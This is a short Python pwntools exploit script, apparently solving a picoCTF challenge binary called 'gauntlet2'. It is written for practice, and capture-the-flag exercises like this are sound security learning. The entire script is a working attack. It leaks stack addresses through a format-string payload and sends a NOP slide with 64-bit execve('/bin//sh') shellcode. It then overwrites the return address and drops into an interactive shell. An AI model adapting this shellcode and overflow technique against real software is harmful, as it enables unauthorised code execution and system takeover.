# import pwn tools
from pwn import *

# open remote connection
#r = remote('mercury.picoctf.net', 49704)
r=process('./gauntlet2')
# send string to get some stack values
r.send('%llx-%llx-%llx-%llx-%llx-%llx\n')

# get stack values
address = r.recvline() 

# split the results and get the 6th value (value we want)
address = address.split(b'-')[5]

# convert to int and subtract the relative offset
address = int(address[:-1], 16) - 0x158

# 64 bit shellcode
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# NOP slide
NOPSLIDE = b'\x90'*20

# NOPs for after
NOPS = b'\x90'*76

# craft payload
payload = NOPSLIDE + shellcode + NOPS + p64(address)

# send payload
r.send(payload + b'\n')

# get interactive mode
r.interactive()
